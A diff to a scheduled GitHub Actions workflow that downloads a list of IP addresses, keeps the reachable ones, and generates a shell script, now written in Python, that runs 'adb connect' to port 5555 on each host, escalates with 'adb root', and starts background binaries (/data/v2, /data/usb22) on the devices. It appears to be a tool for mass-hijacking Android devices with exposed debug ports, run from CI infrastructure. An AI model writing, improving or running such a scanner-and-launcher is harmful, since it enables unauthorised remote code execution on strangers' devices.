@@ -1,4 +1,4 @@
-name: ADB Connection Test
+name: ADB Connection Test py
 
 on:
   schedule:
@@ -16,7 +16,7 @@ jobs:
     - name: Install Telnet and ADB
       run: |
         sudo apt-get update
-        sudo apt-get install -y telnet adb curl
+        sudo apt-get install -y telnet adb curl python3
 
     - name: Download the 1.txt file from URL
       id: download_file
@@ -63,25 +63,24 @@ jobs:
         echo "Collected reachable IPs:"
         cat $REACHABLE_IPS
 
-    - name: Test ports and run ADB commands
+    - name: Generate ADB commands with Python
       run: |
-        # 创建或清空 t.sh 文件
-        > t.sh
+        # 创建 Python 脚本
+        cat <<EOF > generate_adb_commands.py
+with open('reachable_ips.txt', 'r') as infile, open('t.sh', 'w') as outfile:
+    for line in infile:
+        ip = line.strip()
+        if ip:
+            outfile.write(f'adb connect "{ip}:5555"\n')
+            outfile.write('adb root\n')
+            outfile.write(f'adb -s "{ip}:5555" shell \'sh -c "/data/v2 run > /dev/null 2> /data/error.log &"\'\n')
+            outfile.write(f'adb -s "{ip}:5555" shell \'sh -c "/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &"\'\n')
+            outfile.write(f'adb disconnect "{ip}:5555"\n')
+            outfile.write('\n')
+EOF
 
-        # 逐行读取 reachable_ips.txt 中的 IP 地址
-        while IFS= read -r ip; do
-          # 检查 IP 是否为空
-          if [ -n "$ip" ]; then
-            # 将 IP 替换到模板中，并追加到 t.sh 文件
-            echo "adb connect \"$ip:5555\"" >> t.sh
-            echo "adb root" >> t.sh
-            echo "adb -s \"$ip:5555\" shell 'sh -c \"/data/v2 run > /dev/null 2> /data/error.log &\"'" >> t.sh
-            echo "adb -s \"$ip:5555\" shell 'sh -c \"/data/usb22 -c /data/logfile > /dev/null 2> /data/error.log &\"'" >> t.sh
-            echo "adb disconnect \"$ip:5555\"" >> t.sh
-            echo "" >> t.sh # 添加空行分隔不同 IP 的命令
-          fi
-        done < reachable_ips.txt
-        cat bash t.sh
-        chmod 777 t.sh
+        # 运行 Python 脚本生成 t.sh
+        python3 generate_adb_commands.py
+        cat t.sh
         # 执行生成的 t.sh 脚本
         bash t.sh
